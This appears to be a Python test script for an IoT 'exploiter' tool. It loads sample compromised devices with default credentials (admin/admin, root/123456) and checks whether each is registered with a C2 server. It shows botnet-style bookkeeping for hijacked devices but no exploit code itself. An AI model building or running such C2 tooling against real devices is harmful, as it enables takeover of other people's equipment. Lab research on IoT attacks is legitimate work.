#!/usr/bin/env python3
"""
IoT Digital Twin - Registration Verification System Test

Test script for validating the registration verification functionality
that ensures device synchronization between local data and C2 server.

Educational Purpose Only - For Controlled Lab Environment
Author: IoT Security Research Team
Date: June 2025
"""

import sys
sys.path.append('.')
from exploit import IoTExploiter

def test_registration_verification():
    """Test the registration verification system"""
    
    print("🧪 Testing Registration Verification System")
    print("="*60)
    
    # Create test instance  
    exploiter = IoTExploiter('127.0.0.1')

    # Add test compromised devices to simulate the scenario
    exploiter.compromised_devices = [
        {
            'ip': '192.168.1.100',
            'username': 'admin', 
            'password': 'admin',
            'status': 'online',
            'registered_c2': True,
            'device_type': 'camera',
            'timestamp': '2024-01-01T12:00:00'
        },
        {
            'ip': '192.168.1.101',
            'username': 'root',
            'password': '123456', 
            'status': 'online',
            'registered_c2': False,
            'device_type': 'router',
            'timestamp': '2024-01-01T12:01:00'
        },
        {
            'ip': '192.168.1.102',
            'username': 'admin',
            'password': 'password', 
            'status': 'online',
            'registered_c2': True,
            'device_type': 'iot_device',
            'timestamp': '2024-01-01T12:02:00'
        }
    ]

    print("📊 Test Setup:")
    print(f"  • Total local devices: {len(exploiter.compromised_devices)}")
    print(f"  • Marked as registered: {sum(1 for d in exploiter.compromised_devices if d.get('registered_c2'))}")
    print(f"  • Marked as not registered: {sum(1 for d in exploiter.compromised_devices if not d.get('registered_c2'))}")
    print()

    # Test device IPs
    device_ips = [d['ip'] for d in exploiter.compromised_devices]
    print(f"  • Device IPs: {device_ips}")
    print()

    # Test the analyze_registration_discrepancy function
    print("🔍 Testing registration discrepancy analysis...")
    print("-" * 60)
    exploiter.analyze_registration_discrepancy()

    print()
    print("✅ Registration verification system test completed!")
    print("="*60)
    
    return True

if __name__ == "__main__":
    test_registration_verification()
